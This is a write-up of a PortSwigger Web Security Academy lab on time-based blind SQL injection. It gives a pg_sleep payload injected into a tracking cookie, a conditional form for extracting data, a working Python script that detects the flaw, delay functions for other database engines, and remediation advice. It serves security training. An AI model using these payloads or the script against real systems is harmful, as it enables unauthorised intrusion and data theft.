# Blind SQL Injection with Time Delays
**Platform:** PortSwigger Web Security Academy
**Category:** SQL Injection
**Date:** 2026-08-26

## The Problem
Following labs 11 (boolean-based) and 12 (error-based), this lab represents the third and most general form of blind SQL injection. The application shows **no difference at all** between a true and false injected condition — no content change, and no distinguishable error page. With neither of the previous two oracles available, the only remaining signal is **how long the server takes to respond**.

## Discovery / Exploitation
Instead of asking a true/false question, a time-based payload deliberately makes the database pause for a fixed duration if the injection point is reachable at all:

```sql
'||(SELECT pg_sleep(10))--
```

`pg_sleep(10)` is PostgreSQL's built-in delay function — it makes the database wait 10 seconds before returning a result, regardless of any condition. If this payload is injected successfully into the `TrackingId` cookie and the response takes noticeably longer than normal (over 10 seconds), that delay can only be explained by the payload actually executing inside the database — there's no other way a cookie value could cause a 10-second server response.

This technique also doubles as **the simplest form of blind SQLi detection**: unlike boolean or error-based approaches, it doesn't require crafting a condition tied to real data — it just confirms *that* injection is possible at all, before building out a full character-by-character extraction.

## Impact
Time-based detection proves the presence of a working SQL injection point even when the application gives zero visible feedback of any kind. Once confirmed, the same delay function can be wrapped in a conditional (`CASE WHEN condition THEN pg_sleep(10) ELSE pg_sleep(0) END`) to extract real data character by character — timing takes the place of "Welcome" text or a 500 status code as the true/false signal.

## Proof of Concept (Python)
This script measures the response time of a single request carrying the `pg_sleep(10)` payload and reports whether the delay confirms the injection.

```python
import sys
import requests
import urllib3
import urllib.parse
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def blind_sqli_check(url):
    sqli_payload = "'||(SELECT pg_sleep(10))--"
    sqli_payload_encoded = urllib.parse.quote(sqli_payload)
    cookies = {
        'TrackingId': 'wkkLB3oPZvgmh6Fe' + sqli_payload_encoded,
        'session': 'xopkrbCzK7kLL8Eku299rLrK28KcnLLC'
    }
    r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
    if int(r.elapsed.total_seconds()) > 10:
        print("[+] Vulnerable to time-based blind sql injection")
    else:
        print("[-] Not vulnerable to time-based blind sql injection")


def main():
    if len(sys.argv) != 2:
        print("[+] Usage : %s <url>" % sys.argv[0])
        print("[+] Example : %s https://www.example.com" % sys.argv[0])
        sys.exit(-1)
    url = sys.argv[1]
    print("[+] Checking if tracking cookie is vulnerable to time-based sqli...")
    blind_sqli_check(url)


if __name__ == "__main__":
    main()
```

**How it works:**
1. Takes the target URL as a command-line argument
2. Sends a single request with the `pg_sleep(10)` payload injected into the `TrackingId` cookie
3. Uses `requests`' built-in `response.elapsed` (a `timedelta` measuring the full round-trip time) to check whether the response took over 10 seconds
4. Prints a clear vulnerable/not-vulnerable verdict based purely on timing — no page content is inspected at all

**Example run:**
```bash
python3 exploit_sqli_time_based_check.py https://your-lab-url.web-security-academy.net
```

**Note:** `pg_sleep()` is PostgreSQL-specific. Equivalent delay functions for other engines:
- **MySQL:** `SLEEP(10)`
- **SQL Server:** `WAITFOR DELAY '0:0:10'`
- **Oracle:** `DBMS_LOCK.SLEEP(10)` (requires appropriate privileges, less commonly usable)

## Remediation
- Use **parameterized queries (prepared statements)** — the consistent defense across every SQL injection variant covered in this series.
- Apply **strict timeouts** on database queries at the application or database layer, so a single malicious query cannot hold a connection open for an attacker-controlled duration.
- Apply **rate limiting**, since time-based extraction (like boolean and error-based) requires many sequential slow requests, making it especially detectable and costly to throttle.

## Takeaway
This lab completes the set of three blind SQL injection oracles: content-based (lab 11), error-based (lab 12), and time-based (lab 13). Time-based is the most broadly applicable of the three — it works even when an application gives absolutely no distinguishable feedback of any kind — but it's also the slowest, since confirming or extracting anything requires deliberately waiting out each delay. In practice, it's often used as a last-resort detection method, or combined with the same character-by-character extraction loop from labs 11–12 once basic injectability is confirmed this way.
